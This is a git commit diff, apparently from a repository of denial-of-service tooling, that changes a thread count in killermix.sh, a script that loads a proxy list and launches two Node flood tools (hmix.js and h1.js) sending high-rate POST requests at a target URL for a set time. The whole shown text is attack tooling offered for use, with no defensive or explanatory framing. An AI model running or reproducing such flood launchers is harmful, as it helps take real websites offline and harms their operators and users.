e1139c4e5e4382c5e625dd15cb1c9ac2e0f97594
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-13 10:00:41 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -14,7 +14,7 @@ done > live.txt
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
-node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 2 -r 48 --full true -d false &
+node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 -r 48 --full true -d false &
 
 node h1.js POST "$URL" live.txt "$TIME" 999 24 randomstring="true" &
 
